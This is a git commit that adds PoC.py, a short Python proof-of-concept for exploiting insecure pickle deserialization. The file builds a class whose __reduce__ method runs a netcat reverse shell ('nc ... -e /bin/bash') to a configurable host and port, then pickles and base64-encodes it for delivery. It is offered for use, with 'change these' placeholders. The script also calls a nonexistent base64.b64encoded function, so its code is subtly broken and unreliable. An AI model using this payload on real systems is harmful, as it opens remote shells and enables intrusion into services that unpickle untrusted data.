f2e1c7b268348dca5b2942c7588fa19e7ad803f0
exec1337 <81878337+exec1337@users.noreply.github.com>
2021-04-05 20:43:53 +0000

    Create PoC.py

---
+++ PoC.py
@@ -0,0 +1,16 @@
+# PoC for a reverse shell for deserialization
+
+import pickle, os, base64
+
+# change these
+LHOST = '127.0.0.1'
+LPORT = '1337'
+
+class exploit:
+    def __reduce__(self):
+        return(os.system, (f'nc {LHOST} {LPORT} -e /bin/bash',) )
+
+serialized = pickle.dumps(exploit())
+final = base64.b64encoded(serialized)
+
+print(final)
